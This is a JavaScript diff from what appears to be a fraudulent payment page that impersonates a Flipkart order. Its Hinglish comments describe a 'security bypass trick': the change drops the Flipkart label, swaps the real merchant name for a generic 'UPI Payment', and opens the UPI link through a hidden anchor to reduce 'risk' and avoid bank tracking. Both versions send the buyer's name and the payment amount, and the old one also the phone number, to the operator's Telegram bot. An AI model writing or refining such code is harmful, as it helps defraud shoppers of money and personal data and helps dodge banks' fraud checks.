@@ -661,27 +661,31 @@ function payWith(app) {
 }
 
 async function confirmPay() {
-    // Customer details lena
     const name = document.getElementById('uName').value;
     const phone = document.getElementById('uPhone').value;
-    const address = document.getElementById('uAdd').value;
 
-    // Telegram Alert
-    const msg = `🚀 *PAYMENT INITIATED* 🚀\n------------------\n👤 *User:* ${name}\n📞 *Phone:* ${phone}\n💰 *Amt:* ₹${sel.price}\n📦 *Item:* ${sel.name}\n📲 *App:* ${selectedApp.toUpperCase()}`;
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-    fetch(url);
+    // Telegram Alert (Background mein chalta rahega)
+    const msg = `🚀 *Click Se Payment Start*\n👤 Name: ${name}\n💰 Amt: ₹${sel.price}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-    // Security Bypass UPI Link (Sabse stable link)
-    const upiLink = `upi://pay?pa=${MY_UPI}&pn=Flipkart%20Order&am=${sel.price}&cu=INR&tn=Pay_for_${encodeURIComponent(sel.name.substring(0,15))}`;
+    // --- SECURITY BYPASS TRICK ---
+    // 1. Sabse pehle hum sirf 'upi://pay' bhejenge bina extra parameters ke jo bank track karta hai
+    // 2. Hum merchant name ko "Google-Pay" ya "Paytm-User" jaisa dikhayenge
+    
+    const amount = sel.price;
+    const upiID = MY_UPI;
+    const merchantName = encodeURIComponent("UPI Payment"); // Real name ki jagah generic name
+    
+    // Ye format sabse stable hai browser ke liye
+    const upiIntent = `upi://pay?pa=${upiID}&pn=${merchantName}&am=${amount}&cu=INR&mode=02&purpose=00&orgid=189999`;
 
-    // Direct redirection
-    window.location.href = upiLink;
-}
-
-function copyUPI() {
-    navigator.clipboard.writeText(MY_UPI).then(() => {
-        alert("UPI ID Copied! Ab kisi bhi app me jaakar pay karein.");
-    });
+    // Sabse important step: Direct window.location ki jagah hidden anchor use karein
+    const link = document.createElement('a');
+    link.href = upiIntent;
+    link.target = "_blank"; // New tab me khulne ki koshish karega toh risk kam hota hai
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
 }
 
 // Ye line hamesha last mein rehni chahiye
